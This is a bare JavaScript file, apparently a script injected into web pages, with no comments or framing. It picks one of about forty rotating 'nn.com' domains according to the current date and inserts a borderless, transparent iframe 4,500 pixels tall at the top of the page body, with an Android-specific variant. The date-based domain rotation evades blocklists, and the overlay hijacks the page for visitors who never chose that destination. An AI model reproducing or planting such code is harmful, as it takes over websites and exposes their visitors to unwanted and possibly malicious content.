var host = window.location.host.toLowerCase();
var url = new Array();
url.push("294nn.com");
url.push("303nn.com");
url.push("304nn.com");
url.push("308nn.com");
url.push("309nn.com");
url.push("320nn.com");
url.push("491nn.com");
url.push("493nn.com");
url.push("494nn.com");
url.push("497nn.com");
url.push("498nn.com");
url.push("503nn.com");
url.push("504nn.com");
url.push("506nn.com");
url.push("529nn.com");
url.push("530nn.com");
url.push("532nn.com");
url.push("535nn.com");
url.push("537nn.com");
url.push("539nn.com");
url.push("547nn.com");
url.push("548nn.com");
url.push("550nn.com");
url.push("553nn.com");
url.push("554nn.com");
url.push("562nn.com");
url.push("571nn.com");
url.push("572nn.com");
url.push("573nn.com");
url.push("574nn.com");
url.push("581nn.com");
url.push("583nn.com");
url.push("587nn.com");
url.push("589nn.com");
url.push("593nn.com");
url.push("594nn.com");
url.push("596nn.com");
url.push("598nn.com");
url.push("602nn.com");
url.push("603nn.com");
url.push("607nn.com");
var from = new Date(2018, 11, 9).getTime();
var seed = 1;
function getdz() {
    var i = Math.floor((new Date().getTime() - from) * seed / 86400050);
    if (i < 0 || i >= url.length) {
        i = url.length - 1
    }
    return "https://www." + escape(url[i])
}
var dz=getdz();
console.log(dz);
var divObj=document.createElement("div");
var n = navigator.userAgent.toLowerCase();
if (n.indexOf('android')>-1){
divObj.innerHTML='<iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="4500px" allowTransparency src="'+
dz+'"></iframe>';
}
 else {
divObj.innerHTML='<center><iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="4500px" allowTransparency src="'+
dz+'"></iframe></center>';
}
var first=document.body.firstChild;
document.body.insertBefore(divObj,first);
